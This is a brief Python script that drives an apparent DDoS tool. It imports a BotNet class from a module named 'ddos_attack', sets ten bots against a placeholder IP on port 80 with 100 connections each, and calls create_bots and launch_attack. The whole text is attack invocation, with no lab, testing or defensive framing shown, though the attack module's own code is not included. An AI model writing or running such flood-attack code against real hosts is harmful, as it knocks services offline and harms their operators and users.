from src.ddos_attack import BotNet

botnet = BotNet(
    10, "xxx.xxx.x.x", 80, 100
)  # num of bots, target IP, target port, connections per bot
botnet.create_bots()
botnet.launch_attack()
